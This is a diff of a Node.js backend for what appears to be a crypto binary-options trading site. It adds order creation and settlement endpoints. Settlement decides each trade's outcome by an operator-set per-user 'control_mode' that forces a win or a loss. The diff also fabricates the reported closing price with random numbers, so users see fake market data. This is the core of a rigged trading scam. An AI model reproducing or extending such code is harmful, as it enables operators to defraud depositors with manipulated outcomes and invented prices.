@@ -405,7 +405,96 @@ app.post("/api/language", authMiddleware, async (req, res) => {
 
   res.json({ success: true, language });
 });
+// =========================================================
+//  订单状态查询（用于前端轮询）
+// =========================================================
+app.get("/api/order/status/:orderId", authMiddleware, async (req, res) => {
+  try {
+    const { orderId } = req.params;
+    const address = req.user.address;
 
+    // 查询订单信息
+    const orderResult = await pool.query(
+      `SELECT o.*, u.control_mode 
+       FROM orders o 
+       LEFT JOIN users u ON o.wallet = u.address 
+       WHERE o.id = $1 AND o.wallet = $2`,
+      [orderId, address]
+    );
+
+    if (orderResult.rows.length === 0) {
+      return res.status(404).json({ message: "订单不存在" });
+    }
+
+    const order = orderResult.rows[0];
+    const now = Date.now();
+    const createdAt = Number(order.created_at);
+    const period = Number(order.period) || 60; // 默认60秒
+
+    // 计算剩余时间
+    const elapsed = Math.floor((now - createdAt) / 1000);
+    const remainingTime = Math.max(0, period - elapsed);
+
+    // 如果订单已过期但未结算，自动结算
+    if (remainingTime <= 0 && order.status === 'open') {
+      // 自动结算逻辑
+      const isWin = order.control_mode === 'win' ? true : 
+                   order.control_mode === 'lose' ? false : 
+                   Math.random() > 0.5;
+
+      const percent = Number(order.percent) || 0.25;
+      const profit = isWin ? order.amount * percent : -order.amount;
+
+      // 更新用户余额
+      const userResult = await pool.query(
+        "SELECT balances FROM users WHERE address = $1",
+        [address]
+      );
+      const balances = userResult.rows[0].balances;
+      balances.USDT = Number(balances.USDT) + profit;
+
+      await pool.query(
+        "UPDATE users SET balances = $1 WHERE address = $2",
+        [balances, address]
+      );
+
+      // 更新订单状态
+      await pool.query(
+        `UPDATE orders 
+         SET status = 'closed', profit = $1, settled_at = $2 
+         WHERE id = $3`,
+        [profit, now, orderId]
+      );
+
+      return res.json({
+        status: 'completed',
+        remainingTime: 0,
+        isWin,
+        profit,
+        amount: order.amount,
+        startPrice: order.open_price,
+        closePrice: order.open_price + (Math.random() * 200 - 100), // 模拟收盘价
+        percent,
+        cycle: period
+      });
+    }
+
+    // 返回订单状态
+    res.json({
+      status: order.status,
+      remainingTime,
+      orderId: order.id,
+      amount: order.amount,
+      startPrice: order.open_price,
+      period: order.period,
+      percent: order.percent
+    });
+
+  } catch (err) {
+    console.error("order status error:", err);
+    res.status(500).json({ message: "获取订单状态失败" });
+  }
+});
 
 // =========================================================
 //  绑定银行卡
@@ -428,65 +517,81 @@ app.post("/api/bankcard", authMiddleware, async (req, res) => {
 
 
 // =========================================================
-//  下单
+//  下单（增强版，支持后端倒计时）
 // =========================================================
 app.post("/api/order/create", authMiddleware, async (req, res) => {
   try {
-    const { symbol, amount, direction } = req.body;
+    // 添加 period, price, percent 参数
+    const { symbol, amount, direction, period, price, percent } = req.body;
     const address = req.user.address;
 
+    // 获取用户余额和控制模式
     const r = await pool.query(
-      "SELECT balances FROM users WHERE address = $1",
+      "SELECT balances, control_mode FROM users WHERE address = $1",
       [address]
     );
 
     const balances = r.rows[0].balances;
+    const controlMode = r.rows[0].control_mode;
 
     if (balances.USDT < amount)
       return res.status(400).json({ message: "余额不足" });
 
+    // 扣除余额
     balances.USDT -= amount;
 
     await pool.query(
-      "UPDATE users SET balances=$1 WHERE address=$2",
+      "UPDATE users SET balances = $1 WHERE address = $2",
       [balances, address]
     );
 
     const id = "ord_" + Date.now();
     const createdAt = Date.now();
 
+    // ⭐ 使用新的插入语句，包含所有字段
     await pool.query(
-      `INSERT INTO orders(id, wallet, symbol, amount, direction, status, profit, created_at)
-       VALUES($1,$2,$3,$4,$5,'open',0,$6)`,
-      [id, address, symbol, amount, direction, createdAt]
+      `INSERT INTO orders(id, wallet, symbol, amount, direction, status, profit, created_at, period, open_price, percent, control_mode)
+       VALUES($1, $2, $3, $4, $5, 'open', 0, $6, $7, $8, $9, $10)`,
+      [id, address, symbol, amount, direction, createdAt, period, price, percent, controlMode]
     );
 
-  // ⭐ 获取用户备注（因为上面的查询不包含 remark 字段）
-const remarkResult = await pool.query(
-  "SELECT remark FROM users WHERE address=$1",
-  [address]
-);
+    // 获取用户备注
+    const remarkResult = await pool.query(
+      "SELECT remark FROM users WHERE address = $1",
+      [address]
+    );
 
-const userRemark = remarkResult.rows?.[0]?.remark || "";
+    const userRemark = remarkResult.rows?.[0]?.remark || "";
 
-// ⭐ 推送后台
-broadcastToAdmins({
-  type: "NEW_ORDER",
-  order: {
-    id,
-    wallet: address,
-    symbol,
-    amount,
-    direction,
-    createdAt,
-    remark: userRemark,
-  }
-});
-
+    // 推送后台
+    broadcastToAdmins({
+      type: "NEW_ORDER",
+      order: {
+        id,
+        wallet: address,
+        symbol,
+        amount,
+        direction,
+        period,
+        percent,
+        createdAt,
+        remark: userRemark,
+      }
+    });
 
     res.json({
       success: true,
-      order: { id, wallet: address, symbol, amount, direction, status: "open", createdAt },
+      order: { 
+        id, 
+        wallet: address, 
+        symbol, 
+        amount, 
+        direction, 
+        status: "open", 
+        createdAt,
+        period,
+        percent 
+      },
       balances,
     });
 
@@ -495,8 +600,6 @@ broadcastToAdmins({
     res.status(500).json({ message: "下单失败" });
   }
 });
-
-
 
 // =========================================================
 //  查询订单
